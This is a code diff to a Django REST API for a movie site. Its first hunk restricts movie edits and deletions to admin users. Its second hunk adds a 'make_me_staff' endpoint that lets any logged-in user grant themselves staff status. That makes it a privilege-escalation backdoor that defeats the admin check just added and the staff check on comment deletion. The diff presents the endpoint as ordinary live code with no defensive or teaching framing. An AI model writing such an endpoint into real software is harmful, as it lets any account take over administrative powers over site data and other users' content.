@@ -49,6 +49,11 @@ class MovieDetail(generics.RetrieveUpdateDestroyAPIView):
     permission_classes = [AllowAny]  # ← public
     serializer_class = MovieSerializer
 
+    def get_permissions(self):
+            if self.request.method in ['PUT', 'PATCH', 'DELETE']:
+                return [permissions.IsAdminUser()]
+            return [permissions.AllowAny()]
+
 class HeroCarouselMovies(APIView):
     def get(self, request):
         movies = Movie.objects.filter(is_hero=True).order_by('-year')  # optional: sort newest first
@@ -267,3 +272,11 @@ class CommentDelete(generics.DestroyAPIView):
         if instance.user != self.request.user and not self.request.user.is_staff:
             raise permissions.PermissionDenied("Not your comment.")
         super().perform_destroy(instance)
+
+@api_view(['POST'])
+@permission_classes([IsAuthenticated])
+def make_me_staff(request):
+    user = request.user
+    user.is_staff = True
+    user.save()
+    return Response({"message": f"{user.username} is now staff."})
